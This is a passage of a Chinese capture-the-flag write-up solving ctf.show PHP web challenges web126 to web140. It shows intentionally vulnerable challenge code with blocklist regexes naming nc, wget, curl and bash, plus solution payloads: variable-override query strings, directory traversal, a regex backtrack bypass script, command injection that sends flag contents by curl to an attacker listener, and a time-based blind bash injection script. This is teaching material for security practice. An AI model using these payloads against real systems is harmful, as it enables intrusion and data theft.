class="variable">$_POST</span>[<span class="string">&#x27;fun&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fl0g&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print|g|i|f|c|o|d/i&quot;</span>, <span class="variable">$c</span>) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$c</span>)&lt;=<span class="number">16</span>)&#123;</span><br><span class="line">         <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$c</span>&quot;</span>.<span class="string">&quot;;&quot;</span>);  </span><br><span class="line">         <span class="keyword">if</span>(<span class="variable">$fl0g</span>===<span class="string">&quot;flag_give_me&quot;</span>)&#123;</span><br><span class="line">             <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>过滤了部分字母，使用if条件输出flag</p><p>这里须知$_SERVER和parse_str()的用法</p><div class="highlight-wrap" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1、cli模式（命令行）下</span><br><span class="line"></span><br><span class="line">第一个参数$_SERVER[&#x27;argv&#x27;][0]是脚本名，其余的是传递给脚本的参数</span><br><span class="line"></span><br><span class="line">2、web网页模式下</span><br><span class="line"></span><br><span class="line">在web页模式下必须在php.ini开启register_argc_argv配置项</span><br><span class="line"></span><br><span class="line">    设置register_argc_argv = On(默认是Off)，重启服务，$_SERVER[‘argv’]才会有效果</span><br><span class="line"></span><br><span class="line">    这时候的$_SERVER[‘argv’][0] = $_SERVER[‘QUERY_STRING’]</span><br><span class="line"></span><br><span class="line">    $argv,$argc在web模式下不适用</span><br></pre></td></tr></table></figure></div><p>$_SERVER[‘QUERY_STRING’]用于查询字符串</p><p>parse_str()把查询字符串解析到变量（extract() 函数从数组中将变量导入到当前的符号表。也可以起到变量覆盖的作用</p><p>parse_str()给变量赋值，在这里是给数组a的第2个赋值，<br>且数组是以空格来划分，这里就用+来代替空格，<br>可以实现把变量fl0g值覆盖为flag_give_me</p><div class="highlight-wrap" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://69309a51-ef74-4426-b613-5a34ec121105.challenge.ctf.show/?z=1+fl0g=flag_give_me</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CTF_SHOW=1&amp;CTF[SHOW.COM=1&amp;fun=parse_str($a[1])</span><br></pre></td></tr></table></figure></div><h1 id="web127"><a href="#web127" class="headerlink" title="web127"></a>web127</h1><p>空格就能绕过（？</p><h1 id="web128"><a href="#web128" class="headerlink" title="web128"></a>web128</h1><p>用到gettext这个php扩展</p><p>在开启该拓展后 _() 等效于 gettext()</p><div class="highlight-wrap" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">var_dump(call_user_func(call_user_func($</span><span class="language-bash">f1,<span class="variable">$f2</span>)));</span></span><br><span class="line">var_dump(call_user_func(call_user_func(_,&#x27;get_defined_vars&#x27;)));</span><br><span class="line">var_dump(call_user_func(get_defined_vars));</span><br></pre></td></tr></table></figure></div><p>get_defined_vars ( void ) : array 函数返回一个包含所有已定义变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量。</p><h1 id="web129"><a href="#web129" class="headerlink" title="web129"></a>web129</h1><div class="highlight-wrap" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://c2c0ba88-efa5-48b3-b530-a08a30bdb38b.challenge.ctf.show/?f=/ctfshow/../../../var/www/html/flag.php</span><br></pre></td></tr></table></figure></div><p>目录穿越</p><h1 id="web130-131"><a href="#web130-131" class="headerlink" title="web130-131"></a>web130-131</h1><div class="highlight-wrap" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://0a35c93d-1b1c-4c5d-b551-c9813d6dae06.challenge.ctf.show/&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;f&#x27;</span>: <span class="string">&#x27;a&#x27;</span>*<span class="number">1000000</span>+<span class="string">&#x27;36Dctfshow&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">res = requests.post(url=url,data=data)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure></div><h1 id="web133"><a href="#web133" class="headerlink" title="web133"></a>web133</h1><div class="highlight-wrap" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">//flag.php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$F</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;F&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/system|nc|wget|exec|passthru|netcat/i&#x27;</span>, <span class="variable">$F</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$F</span>,<span class="number">0</span>,<span class="number">6</span>));</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;6个字母都还不够呀?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>传递参数本身实现变量的覆盖从而绕过截断函数的限制</p><p>curl是一种命令行工具，作用是发出网络请求，然后获取数据，显示在”标准输出“上。</p><p>curl -f将flag文件上传到Brup Suite的Collaborator Client（类似于DNSLOG），其功能要比DNSLOG强大，主要体现在可以查看POST请求以及打Cookies<br>查看网页源码：直接在curl命令后面加上网址 例如curl <a href="http://www.baidu.com/">www.baidu.com</a></p><p>如果要把这个网页保存下来，可以使用-o参数 例如curl -o 【文件名】 <a href="http://www.baidu.com/">www.baidu.com</a></p><p>发送表单信息：</p><p>GET方式相对简单，只要把数据附在网址后面就行</p><p>POST方式必须要把数据和网址分开，curl就要用到–data或者是-d参数；例如 curl -X POST –data “data&#x3D;xxx” <a href="http://www.xxx.com/">www.xxx.com</a> (不加-X默认是GET方式 -X可以指定请求方式)</p><p>curl带到外面用nc监听</p><div class="highlight-wrap" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?F=`<span class="variable">$F</span>`;+curl http:<span class="comment">//xxxx:2333/`cat f*|grep ctfshow`;</span></span><br></pre></td></tr></table></figure></div><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/img/image-20230129134442774.png" alt="image-20230129134442774"></p><h1 id="web134"><a href="#web134" class="headerlink" title="web134"></a>web134</h1><p>我感觉看的extract()就应该想变量覆盖</p><div class="highlight-wrap" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$key1</span> = <span class="number">0</span>;</span><br><span class="line"><span class="variable">$key2</span> = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key1&#x27;</span>]) || <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key2&#x27;</span>]) || <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;key1&#x27;</span>]) || <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;key2&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;nonononono&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="title function_ invoke__">parse_str</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$key1</span> == <span class="string">&#x27;36d&#x27;</span> &amp;&amp; <span class="variable">$key2</span> == <span class="string">&#x27;36d&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;flag.php&#x27;</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>parse_str配合extract可以把查询的post写进变量实现覆盖</p><p>$_SERVER[‘QUERY_STRING’]是查询url后面的参数，因此以get形式传递</p><div class="highlight-wrap" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//a2aa8587-a351-47ca-b6df-41b8405965b6.challenge.ctf.show/?_POST[key1]=36d&amp;_POST[key2]=36d</span></span><br></pre></td></tr></table></figure></div><h1 id="web135"><a href="#web135" class="headerlink" title="web135"></a>web135</h1><div class="highlight-wrap" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">//flag.php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$F</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;F&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/system|nc|wget|exec|passthru|bash|sh|netcat|curl|cat|grep|tac|more|od|sort|tail|less|base64|rev|cut|od|strings|tailf|head/i&#x27;</span>, <span class="variable">$F</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$F</span>,<span class="number">0</span>,<span class="number">6</span>));</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;师傅们居然破解了前面的，那就来一个加强版吧&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>原来还可以直接nl写入进去，这样其实133也可以这么做</p><div class="highlight-wrap" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?F=`<span class="variable">$F</span> `;nl f*&gt;<span class="number">123</span></span><br></pre></td></tr></table></figure></div><h1 id="web136"><a href="#web136" class="headerlink" title="web136"></a>web136</h1><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/img/image-20230129135125938.png" alt="image-20230129135125938"></p><p>还是写入文件，使用tee命令</p><div class="highlight-wrap" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c=ls /|tee <span class="number">1233</span></span><br><span class="line">c=cat /f149_15_h3r3|tee <span class="number">12332</span>   </span><br></pre></td></tr></table></figure></div><h1 id="web137"><a href="#web137" class="headerlink" title="web137"></a>web137</h1><div class="highlight-wrap" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;private class&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctfshow&#x27;</span>]);</span><br></pre></td></tr></table></figure></div><p>羽师傅：</p><div class="highlight-wrap" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php中 -&gt;与:: 调用类中的成员的区别</span><br><span class="line">-&gt;用于动态语境处理某个类的某个实例</span><br><span class="line">::可以调用一个静态的、不依赖于其他初始化的类方法.</span><br></pre></td></tr></table></figure></div><p>双冒号可以不用实例化类就可以直接调用类中的方法</p><div class="highlight-wrap" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow=ctfshow::<span class="variable constant_">getFlag</span></span><br></pre></td></tr></table></figure></div><h1 id="web138"><a href="#web138" class="headerlink" title="web138"></a>web138</h1><div class="highlight-wrap" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;private class&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strripos</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctfshow&#x27;</span>], <span class="string">&quot;:&quot;</span>)&gt;-<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;private function&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctfshow&#x27;</span>]);</span><br></pre></td></tr></table></figure></div><p>call_user_func中不但可以传字符串也可以传数组</p><p>过滤了冒号，传输组</p><div class="highlight-wrap" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow[<span class="number">0</span>]=ctfshow&amp;ctfshow[<span class="number">1</span>]=getFlag</span><br></pre></td></tr></table></figure></div><h1 id="web139"><a href="#web139" class="headerlink" title="web139"></a>web139</h1><div class="highlight-wrap" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$x</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, <span class="variable">$x</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;too young too simple sometimes naive!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">check</span>(<span class="variable">$c</span>);</span><br><span class="line">    <span class="title function_ invoke__">exec</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><p>ban了mkdir,没法写</p><p>bash盲注</p><div class="highlight-wrap" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment">#__author__: 颖奇L&#x27;Amore www.gem-love.com</span></span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import time <span class="keyword">as</span> t</span><br><span class="line"><span class="keyword">from</span> urllib.parse import quote <span class="keyword">as</span> urlen</span><br><span class="line">url  = <span class="string">&#x27;http://85abd7bc-8396-47d1-81d7-a10e92331e33.challenge.ctf.show/?c=&#x27;</span></span><br><span class="line">alphabet = [<span class="string">&#x27;&#123;&#x27;</span>,<span class="string">&#x27;&#125;&#x27;</span>, <span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;/&#x27;</span>,<span class="string">&#x27;@&#x27;</span>,<span class="string">&#x27;-&#x27;</span>,<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;=&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;j&#x27;</span>,<span class="string">&#x27;h&#x27;</span>,<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;g&#x27;</span>,<span class="string">&#x27;k&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;n&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;p&#x27;</span>,<span class="string">&#x27;q&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;u&#x27;</span>,<span class="string">&#x27;v&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;y&#x27;</span>,<span class="string">&#x27;z&#x27;</span>,<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;B&#x27;</span>,<span class="string">&#x27;C&#x27;</span>,<span class="string">&#x27;D&#x27;</span>,<span class="string">&#x27;E&#x27;</span>,<span class="string">&#x27;F&#x27;</span>,<span class="string">&#x27;G&#x27;</span>,<span class="string">&#x27;H&#x27;</span>,<span class="string">&#x27;I&#x27;</span>,<span class="string">&#x27;J&#x27;</span>,<span class="string">&#x27;K&#x27;</span>,<span class="string">&#x27;L&#x27;</span>,<span class="string">&#x27;M&#x27;</span>,<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;O&#x27;</span>,<span class="string">&#x27;P&#x27;</span>,<span class="string">&#x27;Q&#x27;</span>,<span class="string">&#x27;R&#x27;</span>,<span class="string">&#x27;S&#x27;</span>,<span class="string">&#x27;T&#x27;</span>,<span class="string">&#x27;U&#x27;</span>,<span class="string">&#x27;V&#x27;</span>,<span class="string">&#x27;W&#x27;</span>,<span class="string">&#x27;X&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>,<span class="string">&#x27;Z&#x27;</span>,<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;9&#x27;</span>]</span><br><span class="line"></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i in <span class="title function_ invoke__">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line"><span class="keyword">for</span> char in alphabet:</span><br><span class="line"><span class="comment"># payload = &quot;if [ ` ls / | awk &#x27;NR==4&#x27;  |cut -c&#123;&#125;` = &#x27;&#123;&#125;&#x27; ];then sleep 5;fi&quot;.format(i,char) #flag.php</span></span><br><span class="line">payload = <span class="string">&quot;if [ `cat /f149_15_h3r3 | awk &#x27;NR==1&#x27; |cut -c&#123;&#125;` = &#x27;&#123;&#125;&#x27; ];then sleep 5;fi&quot;</span>.<span class="title function_ invoke__">format</span>(i,char)</span><br><span class="line"><span class="comment"># data = &#123;&#x27;cmd&#x27;:payload&#125;</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">start = <span class="keyword">int</span>(t.<span class="title function_ invoke__">time</span>())</span><br><span class="line">r = requests.<span class="title function_ invoke__">get</span>(url+payload)</span><br><span class="line"><span class="comment"># r = requests.post(url, data=data)</span></span><br><span class="line">end = <span class="keyword">int</span>(t.<span class="title function_ invoke__">time</span>()) - start</span><br><span class="line"><span class="comment"># print(i,char)</span></span><br><span class="line"><span class="keyword">if</span> end &gt;= <span class="number">3</span>:</span><br><span class="line">result += char</span><br><span class="line"><span class="keyword">print</span>(<span class="string">&quot;Flag: &quot;</span>+result)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">except <span class="built_in">Exception</span> <span class="keyword">as</span> e:</span><br><span class="line"><span class="keyword">print</span>(e)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><h1 id="web140"><a href="#web140" class="headerlink" title="web140"></a>web140</h1><div class="highlight-wrap" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;f1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;f2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$f1</span> = (String)<span class="variable">$_POST</span>[<span class="string">&#x27;f1&#x27;</span>];</span><br><span class="line">    <span class="variable">$f2</span> = (String)<span class="variable">$_POST</span>[<span class="string">&#x27;f2&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-z0-9]+$/&#x27;</span>, <span class="variable">$f1</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-z0-9]+$/&#x27;</span>, <span class="variable">$f2</span>))&#123;</span><br><span class="line">            <span class="variable">$code</span> = <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$f1</span>(<span class="subst">$f2</span>());&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$code</span>) == <span class="string">&#x27;ctfshow&#x27;</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>php松散比较</p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/img/image-20230129145544747.png" alt="image-20230129145544747"></p><p>eg：</p><div class="highlight-wrap" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;abc&#x27;</span> == <span class="number">0</span> ? <span class="string">&#x27;相等&#x27;</span> : <span class="string">&#x27;不相等&#x27;</span>;<span class="comment">//相等</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;1abc&#x27;</span> == <span class="number">1</span> ? <span class="string">&#x27;相等&#x27;</span> : <span class="string">&#x27;不相等&#x27;</span>;<span class="comment">//相等</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;abc1&#x27;</span> == <span class="number">1</span> ? <span class="string">&#x27;相等&#x27;</span> : <span class="string">&#x27;不相等&#x27;</span>;<span 